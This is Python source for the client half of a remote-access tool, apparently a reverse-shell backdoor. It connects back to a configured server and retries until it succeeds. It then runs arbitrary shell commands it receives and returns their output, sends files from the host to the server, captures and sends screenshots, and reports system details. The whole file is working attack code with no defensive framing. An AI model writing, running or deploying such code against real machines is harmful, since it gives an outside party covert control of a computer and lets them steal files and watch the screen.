import os
import socket
import subprocess
import time
import platform
import psutil
import mss
import sys

# Configuration
RETRY_INTERVAL = 5  # Seconds to wait before retrying connection

# Function to create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '0.0.0.0'  # Server IP
        port = 9999
        s = socket.socket()
        print("[INFO] Socket created successfully")
    except socket.error as msg:
        print(f"[ERROR] Socket creation failed: {msg}")

# Function to connect to the server
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
        os_name = f"{platform.system()} {platform.release()} ({platform.architecture()[0]})"
        s.send(os_name.encode())
        print("[INFO] Connected to the server")
    except socket.error as msg:
        print(f"[ERROR] Connection failed: {msg}")
        time.sleep(RETRY_INTERVAL)
        socket_connect()

# Function to handle the download command
def download_file(filename):
    global s
    try:
        # Check if the file exists
        if not os.path.exists(filename):
            s.send(b"0")
            return
        else:
            filename = os.path.basename(filename)
            file_size = str(os.path.getsize(filename))
            print(f"File size to send: {file_size} bytes")

        # Send the file size as a string, followed by a separator
            s.send(f"{filename}:{file_size}".encode())
            
            ack = s.recv(1024).decode()
            if ack != "SIZE_RECEIVED":
                print("Error: Acknowledgment not received for file size")
                return

        # Open the file and send it in chunks
            with open(filename, "rb") as f:
                print("Sending file...")
                total_sent = 0
                while True:
                    bytes_read = f.read(1024)  # Read 1024 bytes
                    if not bytes_read:
                        break
                    s.send(bytes_read)  # Send the bytes
                    total_sent += len(bytes_read)

            print("\nFile sent successfully.")
            time.sleep(1)
            s.send(str.encode(os.getcwd() + '> '))


        
    except Exception as e:
        print(f"[ERROR] Error sending file: {e}")


# Function to gather system information
def gather_system_info():
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        disk_info = psutil.disk_usage('/')
        system_info = (
            f"CPU Usage: {cpu_usage}%\n"
            f"Memory Usage: {memory_info.percent}%\n"
            f"Disk Usage: {disk_info.percent}%\n"
        )
        s.send(system_info.encode())
    except Exception as e:
        s.send(str.encode(f"[ERROR] Failed to gather system info: {e}"))
        
def send_screenshot():
    try:
        with mss.mss() as sct:
            screenshot = sct.shot(output="screenshot.png")
        with open(screenshot, 'rb') as file:
            file_data = file.read()
            file_size = len(file_data)
            s.send(str(file_size).encode())
            time.sleep(1)
            s.send(file_data)
            time.sleep(1)
            s.send(str.encode(os.getcwd() + '> '))
            os.remove("screenshot.png")
        print("[INFO] Screenshot captured and sent successfully.")
    except Exception as e:
        s.send(str.encode(f"[ERROR] Failed to capture screenshot: {e}"))

# Function to handle commands from the server
def receive_commands():
    global s
    while True:
        try:
            data = s.recv(1024).decode("utf-8")
            if data.startswith("cd "):
                # Change directory command
                try:
                    os.chdir(data[3:])
                    s.send(str.encode(os.getcwd() + '> '))
                except Exception as e:
                    s.send(str.encode(f"[ERROR] {e}\n"))
            elif data == "cd":
                o=platform.system()
                print(o)
                if o == "Linux":
                    os.chdir(os.path.expanduser('~'))
                    s.send(str.encode(os.getcwd() + '> '))
                elif o == "Windows":
                    s.send(str.encode(os.getcwd() + '\n' + os.getcwd() + '> '))
                else:
                    break        
            elif data == "cwd":
                s.send(str.encode(os.getcwd() + '> '))
            elif data == "screenshot":
                send_screenshot()
            elif data == "sysinfo":
                gather_system_info()
            elif data.startswith("download "):
                filename = data.split(" ")[1].strip()
                print(filename)
                download_file(filename)
            elif data == "killit":
                s.send(str.encode("[INFO] Connection closing..."))
                print("[INFO] Received killit command. Exiting...")
                s.close()
                sys.exit(0)  # Exit the program
            else:
                # Execute shell commands
                try:
                    cmd = subprocess.Popen(
                        data,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                    )
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes, "utf-8")
                    s.send(str.encode(output_str + os.getcwd() + '> '))
                except Exception as e:
                    s.send(str.encode(f"[ERROR] {e}\n"))
        except Exception as e:
            print(f"[ERROR] Connection lost: {e}")
            break

# Main function to manage the client
def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        print("[INFO] Client shutting down...")
        sys.exit(0)  # Ensure the client exits cleanly when finished

if __name__ == "__main__":
    main()

